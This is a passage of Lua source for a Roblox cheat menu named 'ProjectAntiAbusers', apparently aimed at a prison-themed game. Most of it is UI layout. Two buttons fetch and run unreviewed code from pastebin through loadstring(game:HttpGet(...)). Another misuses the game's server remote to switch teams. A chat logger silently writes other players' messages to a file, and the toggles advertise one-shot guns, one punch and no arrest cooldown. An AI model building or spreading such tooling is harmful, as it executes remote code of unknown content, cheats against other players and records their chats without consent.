ProjectAntiAbusers.ReportExploiterTextBox.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.ReportExploiterTextBox.BorderColor3 = Color3.fromRGB(11, 94, 154)
ProjectAntiAbusers.ReportExploiterTextBox.BorderSizePixel = 2
ProjectAntiAbusers.ReportExploiterTextBox.Position = UDim2.new(0.553884804, 0, 0.368644089, 0)
ProjectAntiAbusers.ReportExploiterTextBox.Size = UDim2.new(0, 163, 0, 39)
ProjectAntiAbusers.ReportExploiterTextBox.Font = Enum.Font.SourceSans
ProjectAntiAbusers.ReportExploiterTextBox.PlaceholderText = "Place Exploiter Username here!"
ProjectAntiAbusers.ReportExploiterTextBox.Text = ""
ProjectAntiAbusers.ReportExploiterTextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.ReportExploiterTextBox.TextSize = 14.000

ProjectAntiAbusers.ReportExploiterButton.Name = "ReportExploiterButton"
ProjectAntiAbusers.ReportExploiterButton.Parent = ProjectAntiAbusers.ReportExploiterTextBox
ProjectAntiAbusers.ReportExploiterButton.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.ReportExploiterButton.Position = UDim2.new(-0.0031059254, 0, 1.1533128, 0)
ProjectAntiAbusers.ReportExploiterButton.Size = UDim2.new(0, 163, 0, 25)
ProjectAntiAbusers.ReportExploiterButton.Font = Enum.Font.SourceSans
ProjectAntiAbusers.ReportExploiterButton.Text = "Report Exploiter"
ProjectAntiAbusers.ReportExploiterButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.ReportExploiterButton.TextSize = 14.000

ProjectAntiAbusers.UICorner_39.Parent = ProjectAntiAbusers.ReportExploiterButton

ProjectAntiAbusers.OtherGuisFrame.Name = "OtherGuisFrame"
ProjectAntiAbusers.OtherGuisFrame.Parent = ProjectAntiAbusers.Background
ProjectAntiAbusers.OtherGuisFrame.BackgroundColor3 = Color3.fromRGB(71, 71, 71)
ProjectAntiAbusers.OtherGuisFrame.Position = UDim2.new(0.218999997, 0, 0.0869999975, 0)
ProjectAntiAbusers.OtherGuisFrame.Size = UDim2.new(0, 399, 0, 236)
ProjectAntiAbusers.OtherGuisFrame.Visible = false

ProjectAntiAbusers.UICorner_40.Parent = ProjectAntiAbusers.OtherGuisFrame

ProjectAntiAbusers.ChatLogger1.Name = "ChatLogger1"
ProjectAntiAbusers.ChatLogger1.Parent = ProjectAntiAbusers.OtherGuisFrame
ProjectAntiAbusers.ChatLogger1.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.ChatLogger1.Position = UDim2.new(0.0100250626, 0, 0.237288147, 0)
ProjectAntiAbusers.ChatLogger1.Size = UDim2.new(0, 169, 0, 39)
ProjectAntiAbusers.ChatLogger1.Font = Enum.Font.SourceSans
ProjectAntiAbusers.ChatLogger1.Text = "Chat Logger 1"
ProjectAntiAbusers.ChatLogger1.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.ChatLogger1.TextSize = 21.000
ProjectAntiAbusers.ChatLogger1.MouseButton1Click:connect(function()
	loadstring(game:HttpGet("https://pastebin.com/raw/BtmQneK8"))()
end)

ProjectAntiAbusers.UICorner_41.Parent = ProjectAntiAbusers.ChatLogger1

ProjectAntiAbusers.ChatLogger2.Name = "ChatLogger2"
ProjectAntiAbusers.ChatLogger2.Parent = ProjectAntiAbusers.OtherGuisFrame
ProjectAntiAbusers.ChatLogger2.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.ChatLogger2.Position = UDim2.new(0.568922281, 0, 0.237288117, 0)
ProjectAntiAbusers.ChatLogger2.Size = UDim2.new(0, 169, 0, 39)
ProjectAntiAbusers.ChatLogger2.Font = Enum.Font.SourceSans
ProjectAntiAbusers.ChatLogger2.Text = "Chat Logger 2"
ProjectAntiAbusers.ChatLogger2.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.ChatLogger2.TextSize = 21.000
ProjectAntiAbusers.ChatLogger2.MouseButton1Click:connect(function()
	if not isfile("./anti abusers/chatlog.txt") then
		writefile("./anti abusers/chatlog.txt", "this is the start of your chat log")
	end
	function output(plr, msg)
		appendfile("./anti asbusers/chatlog.txt", plr..": "..msg)
	end
	for i, user in pairs(game.Players:GetPlayers()) do
		user.Chatted:connect(function(msg)
			output(user, msg)
		end)
	end

	game.Players.ChildAdded:connect(function(child)
		if child:IsA("Player") then
			child.Chatted:connect(function(msg)
				output(child, msg)
			end)
		end
	end)
end)

ProjectAntiAbusers.UICorner_42.Parent = ProjectAntiAbusers.ChatLogger2

ProjectAntiAbusers.RemoteSpy.Name = "RemoteSpy"
ProjectAntiAbusers.RemoteSpy.Parent = ProjectAntiAbusers.OtherGuisFrame
ProjectAntiAbusers.RemoteSpy.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.RemoteSpy.Position = UDim2.new(0.293233097, 0, 0.483050823, 0)
ProjectAntiAbusers.RemoteSpy.Size = UDim2.new(0, 169, 0, 39)
ProjectAntiAbusers.RemoteSpy.Font = Enum.Font.SourceSans
ProjectAntiAbusers.RemoteSpy.Text = "PAA Remote Spy"
ProjectAntiAbusers.RemoteSpy.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.RemoteSpy.TextSize = 21.000
ProjectAntiAbusers.RemoteSpy.MouseButton1Click:connect(function()
	loadstring(game:HttpGet("https://pastebin.com/raw/cMXFQphB"))()
end)

ProjectAntiAbusers.UICorner_43.Parent = ProjectAntiAbusers.RemoteSpy

ProjectAntiAbusers.TeamStuffFrame.Name = "TeamStuffFrame"
ProjectAntiAbusers.TeamStuffFrame.Parent = ProjectAntiAbusers.Background
ProjectAntiAbusers.TeamStuffFrame.BackgroundColor3 = Color3.fromRGB(71, 71, 71)
ProjectAntiAbusers.TeamStuffFrame.Position = UDim2.new(0.218999997, 0, 0.0869999975, 0)
ProjectAntiAbusers.TeamStuffFrame.Size = UDim2.new(0, 399, 0, 236)
ProjectAntiAbusers.TeamStuffFrame.Visible = false

ProjectAntiAbusers.UICorner_44.Parent = ProjectAntiAbusers.TeamStuffFrame

ProjectAntiAbusers.JoinGuards.Name = "JoinGuards"
ProjectAntiAbusers.JoinGuards.Parent = ProjectAntiAbusers.TeamStuffFrame
ProjectAntiAbusers.JoinGuards.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.JoinGuards.BorderColor3 = Color3.fromRGB(27, 42, 53)
ProjectAntiAbusers.JoinGuards.Position = UDim2.new(0.025062656, 0, 0.0423728824, 0)
ProjectAntiAbusers.JoinGuards.Size = UDim2.new(0, 176, 0, 32)
ProjectAntiAbusers.JoinGuards.Font = Enum.Font.SourceSans
ProjectAntiAbusers.JoinGuards.Text = "Guards"
ProjectAntiAbusers.JoinGuards.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.JoinGuards.TextSize = 21.000

ProjectAntiAbusers.UICorner_45.Parent = ProjectAntiAbusers.JoinGuards

ProjectAntiAbusers.JoinNeutral.Name = "JoinNeutral"
ProjectAntiAbusers.JoinNeutral.Parent = ProjectAntiAbusers.TeamStuffFrame
ProjectAntiAbusers.JoinNeutral.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.JoinNeutral.Position = UDim2.new(0.0275689214, 0, 0.199152544, 0)
ProjectAntiAbusers.JoinNeutral.Size = UDim2.new(0, 176, 0, 32)
ProjectAntiAbusers.JoinNeutral.Font = Enum.Font.SourceSans
ProjectAntiAbusers.JoinNeutral.Text = "Neutral"
ProjectAntiAbusers.JoinNeutral.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.JoinNeutral.TextSize = 21.000

ProjectAntiAbusers.UICorner_46.Parent = ProjectAntiAbusers.JoinNeutral

ProjectAntiAbusers.JoinFogTeam.Name = "JoinFogTeam"
ProjectAntiAbusers.JoinFogTeam.Parent = ProjectAntiAbusers.TeamStuffFrame
ProjectAntiAbusers.JoinFogTeam.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.JoinFogTeam.Position = UDim2.new(0.0250626579, 0, 0.364406765, 0)
ProjectAntiAbusers.JoinFogTeam.Size = UDim2.new(0, 176, 0, 32)
ProjectAntiAbusers.JoinFogTeam.Font = Enum.Font.SourceSans
ProjectAntiAbusers.JoinFogTeam.Text = "Fog Team"
ProjectAntiAbusers.JoinFogTeam.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.JoinFogTeam.TextSize = 21.000

ProjectAntiAbusers.UICorner_47.Parent = ProjectAntiAbusers.JoinFogTeam

ProjectAntiAbusers.JoinRedTeam.Name = "JoinRedTeam"
ProjectAntiAbusers.JoinRedTeam.Parent = ProjectAntiAbusers.TeamStuffFrame
ProjectAntiAbusers.JoinRedTeam.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.JoinRedTeam.Position = UDim2.new(0.0275689233, 0, 0.529661, 0)
ProjectAntiAbusers.JoinRedTeam.Size = UDim2.new(0, 176, 0, 32)
ProjectAntiAbusers.JoinRedTeam.Font = Enum.Font.SourceSans
ProjectAntiAbusers.JoinRedTeam.Text = "Red Team"
ProjectAntiAbusers.JoinRedTeam.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.JoinRedTeam.TextSize = 21.000

ProjectAntiAbusers.UICorner_48.Parent = ProjectAntiAbusers.JoinRedTeam

ProjectAntiAbusers.RGBRedTextBox.Name = "RGB(Red)TextBox"
ProjectAntiAbusers.RGBRedTextBox.Parent = ProjectAntiAbusers.TeamStuffFrame
ProjectAntiAbusers.RGBRedTextBox.BackgroundColor3 = Color3.fromRGB(71, 71, 71)
ProjectAntiAbusers.RGBRedTextBox.BorderColor3 = Color3.fromRGB(11, 94, 154)
ProjectAntiAbusers.RGBRedTextBox.BorderSizePixel = 2
ProjectAntiAbusers.RGBRedTextBox.Position = UDim2.new(0.0300751887, 0, 0.690677941, 0)
ProjectAntiAbusers.RGBRedTextBox.Size = UDim2.new(0, 55, 0, 31)
ProjectAntiAbusers.RGBRedTextBox.Font = Enum.Font.SourceSans
ProjectAntiAbusers.RGBRedTextBox.PlaceholderText = "R"
ProjectAntiAbusers.RGBRedTextBox.Text = ""
ProjectAntiAbusers.RGBRedTextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.RGBRedTextBox.TextSize = 21.000

ProjectAntiAbusers.RGBGreenTextBox.Name = "RGB(Green)TextBox"
ProjectAntiAbusers.RGBGreenTextBox.Parent = ProjectAntiAbusers.TeamStuffFrame
ProjectAntiAbusers.RGBGreenTextBox.BackgroundColor3 = Color3.fromRGB(71, 71, 71)
ProjectAntiAbusers.RGBGreenTextBox.BorderColor3 = Color3.fromRGB(11, 94, 154)
ProjectAntiAbusers.RGBGreenTextBox.BorderSizePixel = 2
ProjectAntiAbusers.RGBGreenTextBox.Position = UDim2.new(0.180451125, 0, 0.690677941, 0)
ProjectAntiAbusers.RGBGreenTextBox.Size = UDim2.new(0, 55, 0, 31)
ProjectAntiAbusers.RGBGreenTextBox.Font = Enum.Font.SourceSans
ProjectAntiAbusers.RGBGreenTextBox.PlaceholderText = "G"
ProjectAntiAbusers.RGBGreenTextBox.Text = ""
ProjectAntiAbusers.RGBGreenTextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.RGBGreenTextBox.TextSize = 21.000

ProjectAntiAbusers.RGBBlueTextBox.Name = "RGB(Blue)TextBox"
ProjectAntiAbusers.RGBBlueTextBox.Parent = ProjectAntiAbusers.TeamStuffFrame
ProjectAntiAbusers.RGBBlueTextBox.BackgroundColor3 = Color3.fromRGB(71, 71, 71)
ProjectAntiAbusers.RGBBlueTextBox.BorderColor3 = Color3.fromRGB(11, 94, 154)
ProjectAntiAbusers.RGBBlueTextBox.BorderSizePixel = 2
ProjectAntiAbusers.RGBBlueTextBox.Position = UDim2.new(0.330827057, 0, 0.690677941, 0)
ProjectAntiAbusers.RGBBlueTextBox.Size = UDim2.new(0, 55, 0, 31)
ProjectAntiAbusers.RGBBlueTextBox.Font = Enum.Font.SourceSans
ProjectAntiAbusers.RGBBlueTextBox.PlaceholderText = "B"
ProjectAntiAbusers.RGBBlueTextBox.Text = ""
ProjectAntiAbusers.RGBBlueTextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.RGBBlueTextBox.TextSize = 21.000

ProjectAntiAbusers.JoinCustomTeamRGB.Name = "JoinCustomTeam(RGB)"
ProjectAntiAbusers.JoinCustomTeamRGB.Parent = ProjectAntiAbusers.TeamStuffFrame
ProjectAntiAbusers.JoinCustomTeamRGB.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.JoinCustomTeamRGB.Position = UDim2.new(0.0300751887, 0, 0.851694942, 0)
ProjectAntiAbusers.JoinCustomTeamRGB.Size = UDim2.new(0, 130, 0, 32)
ProjectAntiAbusers.JoinCustomTeamRGB.Font = Enum.Font.SourceSans
ProjectAntiAbusers.JoinCustomTeamRGB.Text = "Join Custom Team(RGB)"
ProjectAntiAbusers.JoinCustomTeamRGB.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.JoinCustomTeamRGB.TextSize = 14.000

ProjectAntiAbusers.UICorner_49.Parent = ProjectAntiAbusers.JoinCustomTeamRGB

ProjectAntiAbusers.JoinInmate.Name = "JoinInmate"
ProjectAntiAbusers.JoinInmate.Parent = ProjectAntiAbusers.TeamStuffFrame
ProjectAntiAbusers.JoinInmate.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.JoinInmate.Position = UDim2.new(0.531328321, 0, 0.0423728824, 0)
ProjectAntiAbusers.JoinInmate.Size = UDim2.new(0, 176, 0, 32)
ProjectAntiAbusers.JoinInmate.Font = Enum.Font.SourceSans
ProjectAntiAbusers.JoinInmate.Text = "Inmate"
ProjectAntiAbusers.JoinInmate.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.JoinInmate.TextSize = 21.000

ProjectAntiAbusers.UICorner_50.Parent = ProjectAntiAbusers.JoinInmate

ProjectAntiAbusers.JoinCrim.Name = "JoinCrim"
ProjectAntiAbusers.JoinCrim.Parent = ProjectAntiAbusers.TeamStuffFrame
ProjectAntiAbusers.JoinCrim.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.JoinCrim.Position = UDim2.new(0.531328321, 0, 0.199152544, 0)
ProjectAntiAbusers.JoinCrim.Size = UDim2.new(0, 176, 0, 32)
ProjectAntiAbusers.JoinCrim.Font = Enum.Font.SourceSans
ProjectAntiAbusers.JoinCrim.Text = "Criminal"
ProjectAntiAbusers.JoinCrim.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.JoinCrim.TextSize = 21.000

ProjectAntiAbusers.UICorner_51.Parent = ProjectAntiAbusers.JoinCrim

ProjectAntiAbusers.JoinBlackTeam.Name = "JoinBlackTeam"
ProjectAntiAbusers.JoinBlackTeam.Parent = ProjectAntiAbusers.TeamStuffFrame
ProjectAntiAbusers.JoinBlackTeam.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.JoinBlackTeam.Position = UDim2.new(0.533834577, 0, 0.364406765, 0)
ProjectAntiAbusers.JoinBlackTeam.Size = UDim2.new(0, 176, 0, 32)
ProjectAntiAbusers.JoinBlackTeam.Font = Enum.Font.SourceSans
ProjectAntiAbusers.JoinBlackTeam.Text = "Black Team"
ProjectAntiAbusers.JoinBlackTeam.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.JoinBlackTeam.TextSize = 21.000

ProjectAntiAbusers.UICorner_52.Parent = ProjectAntiAbusers.JoinBlackTeam

ProjectAntiAbusers.JoinGreenTeam.Name = "JoinGreenTeam"
ProjectAntiAbusers.JoinGreenTeam.Parent = ProjectAntiAbusers.TeamStuffFrame
ProjectAntiAbusers.JoinGreenTeam.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.JoinGreenTeam.Position = UDim2.new(0.533834577, 0, 0.529661, 0)
ProjectAntiAbusers.JoinGreenTeam.Size = UDim2.new(0, 176, 0, 32)
ProjectAntiAbusers.JoinGreenTeam.Font = Enum.Font.SourceSans
ProjectAntiAbusers.JoinGreenTeam.Text = "Green Team"
ProjectAntiAbusers.JoinGreenTeam.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.JoinGreenTeam.TextSize = 21.000

ProjectAntiAbusers.UICorner_53.Parent = ProjectAntiAbusers.JoinGreenTeam

ProjectAntiAbusers.BrickColourTextBox.Name = "BrickColourTextBox"
ProjectAntiAbusers.BrickColourTextBox.Parent = ProjectAntiAbusers.TeamStuffFrame
ProjectAntiAbusers.BrickColourTextBox.BackgroundColor3 = Color3.fromRGB(71, 71, 71)
ProjectAntiAbusers.BrickColourTextBox.BorderColor3 = Color3.fromRGB(11, 94, 154)
ProjectAntiAbusers.BrickColourTextBox.BorderSizePixel = 2
ProjectAntiAbusers.BrickColourTextBox.Position = UDim2.new(0.536340833, 0, 0.690677941, 0)
ProjectAntiAbusers.BrickColourTextBox.Size = UDim2.new(0, 174, 0, 31)
ProjectAntiAbusers.BrickColourTextBox.Font = Enum.Font.SourceSans
ProjectAntiAbusers.BrickColourTextBox.PlaceholderText = "Place BrickColour here!"
ProjectAntiAbusers.BrickColourTextBox.Text = ""
ProjectAntiAbusers.BrickColourTextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.BrickColourTextBox.TextSize = 18.000

ProjectAntiAbusers.JoinCustomTeamBrickColour.Name = "JoinCustomTeam(BrickColour)"
ProjectAntiAbusers.JoinCustomTeamBrickColour.Parent = ProjectAntiAbusers.TeamStuffFrame
ProjectAntiAbusers.JoinCustomTeamBrickColour.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.JoinCustomTeamBrickColour.Position = UDim2.new(0.649122834, 0, 0.851694942, 0)
ProjectAntiAbusers.JoinCustomTeamBrickColour.Size = UDim2.new(0, 130, 0, 32)
ProjectAntiAbusers.JoinCustomTeamBrickColour.Font = Enum.Font.SourceSans
ProjectAntiAbusers.JoinCustomTeamBrickColour.Text = "Join Custom Team(BrickColour)"
ProjectAntiAbusers.JoinCustomTeamBrickColour.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.JoinCustomTeamBrickColour.TextSize = 12.000

ProjectAntiAbusers.UICorner_54.Parent = ProjectAntiAbusers.JoinCustomTeamBrickColour

ProjectAntiAbusers.JoinCustomTeamRandom.Name = "JoinCustomTeam(Random)"
ProjectAntiAbusers.JoinCustomTeamRandom.Parent = ProjectAntiAbusers.TeamStuffFrame
ProjectAntiAbusers.JoinCustomTeamRandom.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.JoinCustomTeamRandom.Position = UDim2.new(0.380952388, 0, 0.851694942, 0)
ProjectAntiAbusers.JoinCustomTeamRandom.Size = UDim2.new(0, 100, 0, 32)
ProjectAntiAbusers.JoinCustomTeamRandom.Font = Enum.Font.SourceSans
ProjectAntiAbusers.JoinCustomTeamRandom.Text = "Join Random Custom Team"
ProjectAntiAbusers.JoinCustomTeamRandom.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.JoinCustomTeamRandom.TextSize = 10.000
ProjectAntiAbusers.JoinCustomTeamRandom.MouseButton1Click:connect(function()
	a = BrickColor.random()
	picked = a.Name
	saved1 = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
	saved2 = workspace.Camera.CFrame
	workspace.Remote.loadchar:InvokeServer("", picked)
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved1
	wait(.06)
	workspace.Camera.CFrame = saved2
end)

ProjectAntiAbusers.UICorner_55.Parent = ProjectAntiAbusers.JoinCustomTeamRandom

ProjectAntiAbusers.TogglesFrame.Name = "TogglesFrame"
ProjectAntiAbusers.TogglesFrame.Parent = ProjectAntiAbusers.Background
ProjectAntiAbusers.TogglesFrame.BackgroundColor3 = Color3.fromRGB(71, 71, 71)
ProjectAntiAbusers.TogglesFrame.Position = UDim2.new(0.218999997, 0, 0.0869999975, 0)
ProjectAntiAbusers.TogglesFrame.Size = UDim2.new(0, 399, 0, 236)
ProjectAntiAbusers.TogglesFrame.Visible = false

ProjectAntiAbusers.UICorner_56.Parent = ProjectAntiAbusers.TogglesFrame

ProjectAntiAbusers.AutoRespawn.Name = "AutoRespawn"
ProjectAntiAbusers.AutoRespawn.Parent = ProjectAntiAbusers.TogglesFrame
ProjectAntiAbusers.AutoRespawn.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.AutoRespawn.BorderColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.AutoRespawn.Position = UDim2.new(0.025062656, 0, 0.0423728824, 0)
ProjectAntiAbusers.AutoRespawn.Size = UDim2.new(0, 122, 0, 35)
ProjectAntiAbusers.AutoRespawn.Font = Enum.Font.SourceSans
ProjectAntiAbusers.AutoRespawn.Text = "Auto Respawn"
ProjectAntiAbusers.AutoRespawn.TextColor3 = Color3.fromRGB(255, 0, 0)
ProjectAntiAbusers.AutoRespawn.TextSize = 19.000

ProjectAntiAbusers.UICorner_57.Parent = ProjectAntiAbusers.AutoRespawn

ProjectAntiAbusers.OnePunch.Name = "OnePunch"
ProjectAntiAbusers.OnePunch.Parent = ProjectAntiAbusers.TogglesFrame
ProjectAntiAbusers.OnePunch.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.OnePunch.BorderColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.OnePunch.Position = UDim2.new(0.025062656, 0, 0.22457628, 0)
ProjectAntiAbusers.OnePunch.Size = UDim2.new(0, 122, 0, 35)
ProjectAntiAbusers.OnePunch.Font = Enum.Font.SourceSans
ProjectAntiAbusers.OnePunch.Text = "One Punch"
ProjectAntiAbusers.OnePunch.TextColor3 = Color3.fromRGB(255, 0, 0)
ProjectAntiAbusers.OnePunch.TextSize = 19.000

ProjectAntiAbusers.UICorner_58.Parent = ProjectAntiAbusers.OnePunch

ProjectAntiAbusers.AntiTouch.Name = "AntiTouch"
ProjectAntiAbusers.AntiTouch.Parent = ProjectAntiAbusers.TogglesFrame
ProjectAntiAbusers.AntiTouch.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.AntiTouch.BorderColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.AntiTouch.Position = UDim2.new(0.025062656, 0, 0.419491529, 0)
ProjectAntiAbusers.AntiTouch.Size = UDim2.new(0, 122, 0, 35)
ProjectAntiAbusers.AntiTouch.Font = Enum.Font.SourceSans
ProjectAntiAbusers.AntiTouch.Text = "Anti Touch"
ProjectAntiAbusers.AntiTouch.TextColor3 = Color3.fromRGB(255, 0, 0)
ProjectAntiAbusers.AntiTouch.TextSize = 19.000

ProjectAntiAbusers.UICorner_59.Parent = ProjectAntiAbusers.AntiTouch

ProjectAntiAbusers.InfJump.Name = "InfJump"
ProjectAntiAbusers.InfJump.Parent = ProjectAntiAbusers.TogglesFrame
ProjectAntiAbusers.InfJump.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.InfJump.BorderColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.InfJump.Position = UDim2.new(0.025062656, 0, 0.605932236, 0)
ProjectAntiAbusers.InfJump.Size = UDim2.new(0, 122, 0, 35)
ProjectAntiAbusers.InfJump.Font = Enum.Font.SourceSans
ProjectAntiAbusers.InfJump.Text = "Infinite Jump"
ProjectAntiAbusers.InfJump.TextColor3 = Color3.fromRGB(255, 0, 0)
ProjectAntiAbusers.InfJump.TextSize = 19.000

ProjectAntiAbusers.UICorner_60.Parent = ProjectAntiAbusers.InfJump

ProjectAntiAbusers.NoArrestCooldown.Name = "NoArrestCooldown"
ProjectAntiAbusers.NoArrestCooldown.Parent = ProjectAntiAbusers.TogglesFrame
ProjectAntiAbusers.NoArrestCooldown.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.NoArrestCooldown.BorderColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.NoArrestCooldown.Position = UDim2.new(0.025062656, 0, 0.792372942, 0)
ProjectAntiAbusers.NoArrestCooldown.Size = UDim2.new(0, 122, 0, 35)
ProjectAntiAbusers.NoArrestCooldown.Font = Enum.Font.SourceSans
ProjectAntiAbusers.NoArrestCooldown.Text = "No Arrest Cooldown"
ProjectAntiAbusers.NoArrestCooldown.TextColor3 = Color3.fromRGB(255, 0, 0)
ProjectAntiAbusers.NoArrestCooldown.TextSize = 17.000

ProjectAntiAbusers.UICorner_61.Parent = ProjectAntiAbusers.NoArrestCooldown

ProjectAntiAbusers.FullBright.Name = "FullBright"
ProjectAntiAbusers.FullBright.Parent = ProjectAntiAbusers.TogglesFrame
ProjectAntiAbusers.FullBright.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.FullBright.BorderColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.FullBright.Position = UDim2.new(0.353383452, 0, 0.0423728824, 0)
ProjectAntiAbusers.FullBright.Size = UDim2.new(0, 122, 0, 35)
ProjectAntiAbusers.FullBright.Font = Enum.Font.SourceSans
ProjectAntiAbusers.FullBright.Text = "FullBring"
ProjectAntiAbusers.FullBright.TextColor3 = Color3.fromRGB(255, 0, 0)
ProjectAntiAbusers.FullBright.TextSize = 19.000

ProjectAntiAbusers.UICorner_62.Parent = ProjectAntiAbusers.FullBright

ProjectAntiAbusers.RainbowBullet.Name = "RainbowBullet"
ProjectAntiAbusers.RainbowBullet.Parent = ProjectAntiAbusers.TogglesFrame
ProjectAntiAbusers.RainbowBullet.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.RainbowBullet.BorderColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.RainbowBullet.Position = UDim2.new(0.679198027, 0, 0.0423728824, 0)
ProjectAntiAbusers.RainbowBullet.Size = UDim2.new(0, 122, 0, 35)
ProjectAntiAbusers.RainbowBullet.Font = Enum.Font.SourceSans
ProjectAntiAbusers.RainbowBullet.Text = "Rainbow Bullet"
ProjectAntiAbusers.RainbowBullet.TextColor3 = Color3.fromRGB(255, 0, 0)
ProjectAntiAbusers.RainbowBullet.TextSize = 19.000

ProjectAntiAbusers.UICorner_63.Parent = ProjectAntiAbusers.RainbowBullet

ProjectAntiAbusers.OneShotGuns.Name = "OneShotGuns"
ProjectAntiAbusers.OneShotGuns.Parent = ProjectAntiAbusers.TogglesFrame
ProjectAntiAbusers.OneShotGuns.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.OneShotGuns.BorderColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.OneShotGuns.Position = UDim2.new(0.353383452, 0, 0.22457628, 0)
ProjectAntiAbusers.OneShotGuns.Size = UDim2.new(0, 122, 0, 35)
ProjectAntiAbusers.OneShotGuns.Font = Enum.Font.SourceSans
ProjectAntiAbusers.OneShotGuns.Text = "One Shot Guns"
ProjectAntiAbusers.OneShotGuns.TextColor3 = Color3.fromRGB(255, 0, 0)
ProjectAntiAbusers.OneShotGuns.TextSize = 19.000

ProjectAntiAbusers.UICorner_64.Parent = ProjectAntiAbusers.OneShotGuns

ProjectAntiAbusers.RapidPunch.Name = "RapidPunch"
ProjectAntiAbusers.RapidPunch.Parent = ProjectAntiAbusers.TogglesFrame
ProjectAntiAbusers.RapidPunch.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.RapidPunch.BorderColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.RapidPunch.Position = UDim2.new(0.679198027, 0, 0.22457628, 0)
ProjectAntiAbusers.RapidPunch.Size = UDim2.new(0, 122, 0, 35)
ProjectAntiAbusers.RapidPunch.Font = Enum.Font.SourceSans
ProjectAntiAbusers.RapidPunch.Text = "Rapid Punch"
ProjectAntiAbusers.RapidPunch.TextColor3 = Color3.fromRGB(255, 0, 0)
ProjectAntiAbusers.RapidPunch.TextSize = 19.000

ProjectAntiAbusers.UICorner_65.Parent = ProjectAntiAbusers.RapidPunch

ProjectAntiAbusers.InfStamina.Name = "InfStamina"
ProjectAntiAbusers.InfStamina.Parent = ProjectAntiAbusers.TogglesFrame
ProjectAntiAbusers.InfStamina.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.InfStamina.BorderColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.InfStamina.Position = UDim2.new(0.353383452, 0, 0.419491529, 0)
ProjectAntiAbusers.InfStamina.Size = UDim2.new(0, 122, 0, 35)
ProjectAntiAbusers.InfStamina.Font = Enum.Font.SourceSans
ProjectAntiAbusers.InfStamina.Text = "Infinite Stamina"
ProjectAntiAbusers.InfStamina.TextColor3 = Color3.fromRGB(255, 0, 0)
ProjectAntiAbusers.InfStamina.TextSize = 19.000

ProjectAntiAbusers.UICorner_66.Parent = ProjectAntiAbusers.InfStamina

ProjectAntiAbusers.AntiTaze.Name = "AntiTaze"
ProjectAntiAbusers.AntiTaze.Parent = ProjectAntiAbusers.TogglesFrame
ProjectAntiAbusers.AntiTaze.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.AntiTaze.BorderColor3 = Color3.fromRGB(89, 89, 89)
